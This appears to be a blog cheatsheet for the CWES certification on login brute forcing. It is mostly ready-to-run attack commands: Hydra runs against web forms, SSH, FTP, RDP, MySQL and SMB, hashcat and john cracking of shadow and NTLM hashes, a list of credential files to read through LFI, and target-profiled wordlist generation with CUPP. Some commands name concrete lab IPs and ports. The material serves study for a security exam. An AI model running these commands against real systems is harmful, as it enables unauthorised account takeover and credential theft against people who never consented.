---
title: "CWES Cheatsheet — Login Brute Forcing"
date: 2026-03-09
categories: [Certifications, CWES]
tags: [cwes, cheatsheet, brute-force, hydra, hashcat]
---

brute forcing logins is about throwing credentials at a target systematically. pair it with good wordlists and know when to crack hashes offline vs attack live services.

---

## password hash files

### linux

| File | What's Inside | How to Get |
|---|---|---|
| `/etc/passwd` | usernames, UID, home dir, shell -- NO passwords | LFI, any file read |
| `/etc/shadow` | password hashes (need root to read) | privilege escalation, LFI as root |
| `/etc/shadow.bak` | backup of shadow file | same as above |

```bash
# /etc/passwd format:
root:x:0:0:root:/root:/bin/bash
# username:x:UID:GID:info:home:shell
# x means password is in /etc/shadow

# /etc/shadow format:
root:$6$abc123$longhashhere:19000:0:99999:7:::
# username:$hash_type$salt$hash:last_changed:...
# $6$ = SHA-512, $5$ = SHA-256, $1$ = MD5, $y$ = yescrypt
```

### windows

| File | What's Inside | How to Get |
|---|---|---|
| `SAM` | local user password hashes | need SYSTEM access |
| `unattend.xml` | plaintext or base64 passwords from setup | LFI, file read |
| `sysprep.inf` | deployment passwords | LFI, file read |
| `web.config` | connection strings with DB passwords | LFI, file read |

### crack hashes with hashcat

```bash
# identify hash type
hashid '$6$abc123$longhash'
# or
hash-identifier

# crack Linux shadow hash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt    # SHA-512
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt     # MD5
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt    # NTLM (Windows)

# crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### password hash enumeration

files that can contain hashed passwords for offline brute-forcing:

| Windows | Linux |
|---|---|
| unattend.xml | shadow |
| sysprep.inf | shadow.bak |
| SAM | password / passwd |

---

## hydra

### hydra flags explained

| Flag | Meaning | Example |
|---|---|---|
| `-l` | single username | `-l admin` |
| `-L` | username wordlist | `-L users.txt` |
| `-p` | single password | `-p password123` |
| `-P` | password wordlist | `-P rockyou.txt` |
| `-C` | combined user:pass wordlist | `-C defaults.txt` |
| `-f` | stop after first valid login found | always use this |
| `-u` | try each password for all users before next password | avoids lockouts |
| `-s` | custom port | `-s 8080` |
| `-t` | threads (parallel connections) | `-t 4` for SSH (keep low) |
| `-V` | verbose -- show every attempt | for debugging |
| `-o` | save results to file | `-o results.txt` |

always use `-f` to stop when found. use `-u` to loop through users first (avoids account lockout). keep `-t 4` for SSH/FTP (too many threads = connection errors).

---

## hydra for every service

### HTTP basic auth (popup login box)

```bash
# combined wordlist (user:pass format)
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  TARGET_IP -s PORT http-get /

# separate user and pass lists
hydra -L users.txt -P passwords.txt -u -f TARGET_IP -s PORT http-get /
```

### HTTP POST login form

```bash
# step 1: capture login request in Burp to find:
#   - URL path: /login.php
#   - POST parameters: username=admin&password=test
#   - failure indicator: "Invalid credentials" or <form name='login'

# step 2: build hydra command
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f TARGET_IP -s PORT \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
```

### HTTP POST with cookie/header

```bash
# with session cookie
hydra -l admin -P passwords.txt -f TARGET_IP -s PORT \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"

# with custom header
hydra -l admin -P passwords.txt -f TARGET_IP -s PORT \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid:H=X-Forwarded-For: 127.0.0.1"
```

### SSH

```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://TARGET_IP:PORT
hydra -L users.txt -P passwords.txt -u -f -t 4 ssh://TARGET_IP:PORT
```

### FTP

```bash
hydra -l username -P /usr/share/wordlists/rockyou.txt -f ftp://TARGET_IP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://TARGET_IP
```

### RDP

```bash
hydra -l administrator -P passwords.txt -f rdp://TARGET_IP
```

### MySQL

```bash
hydra -l root -P passwords.txt -f mysql://TARGET_IP
```

### SMB

```bash
hydra -l administrator -P passwords.txt -f smb://TARGET_IP
```

### hydra command reference

| Command | Description |
|---|---|
| `hydra -h` | hydra help |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | basic auth brute force - combined wordlist |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | basic auth brute force - user/pass wordlists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | login form brute force - static user, pass wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH brute force - user/pass wordlists |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP brute force - static user, pass wordlist |

---

## wordlists

### password wordlists

| Wordlist | Size | Use |
|---|---|---|
| `/usr/share/wordlists/rockyou.txt` | 14M lines | main brute force wordlist |
| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt` | 92 lines | quick test -- most common 92 passwords |
| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt` | 9,437 lines | medium test |
| `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | combined user:pass | FTP/service default creds |
| `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` | combined user:pass | general default creds |
| `/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt` | 1000 lines | fast brute force |

### username wordlists

| Wordlist | Use |
|---|---|
| `/usr/share/seclists/Usernames/Names/names.txt` | common first names |
| `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | top 17 usernames (admin, root, test...) |
| `/usr/share/seclists/Usernames/cirt-default-usernames.txt` | default service usernames |

---

## personalized wordlists

### step 1: generate with CUPP

```bash
# interactive mode -- asks questions about the target
cupp -i

# enter: first name, last name, birthday, partner name, pet name, etc.
# CUPP generates passwords like: William1990!, bill2024, Gates123
```

### step 2: generate username variations

```bash
# install username-anarchy
git clone https://github.com/urbanadventurer/username-anarchy.git

# generate all possible username formats
./username-anarchy/username-anarchy Bill Gates > usernames.txt

# outputs: bgates, b.gates, bill.gates, gatesb, gates.bill, etc.
```

### step 3: filter to match password policy

```bash
# remove passwords shorter than 8 characters
sed -ri '/^.{,7}$/d' passwords.txt

# remove passwords without special characters
sed -ri '/[!-/:-@\[-`\{-~]+/!d' passwords.txt

# remove passwords without numbers
sed -ri '/[0-9]+/!d' passwords.txt
```

### step 4: combine into hydra attack

```bash
hydra -L usernames.txt -P passwords.txt -u -f TARGET_IP -s PORT \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```

### personalized wordlist command reference

| Command | Description |
|---|---|
| `cupp -i` | creating custom password wordlist |
| `sed -ri '/^.{,7}$/d' william.txt` | remove passwords shorter than 8 |
| `sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt` | remove passwords with no special chars |
| `sed -ri '/[0-9]+/!d' william.txt` | remove passwords with no numbers |
| `./username-anarchy Bill Gates > bill.txt` | generate usernames list |

---

## default passwords

it is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged.

default passwords - login brute force POST form:

```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt \
  -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt \
  -f 83.136.251.168 -s 52278 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

---

## useful post-exploitation commands

| Command | Description |
|---|---|
| `ssh b.gates@SERVER_IP -p PORT` | SSH to server |
| `ftp 127.0.0.1` | FTP to server |
| `su - user` | switch to user |
| `netstat -antp \| grep -i list` | identify internal network services and their ports running on the local victim machine |
| `scp -P 53718 ./william.txt b.gates@83.136.251.221:/tmp` | use SCP to copy files to target |
| `hydra -l m.gates -P /tmp/william.txt ftp://127.0.0.1` | use hydra on the victim locally to identify password of user against internal FTP service |

---

[← Back to CWES Cheatsheet Index](/posts/cwes-cheatsheet/)
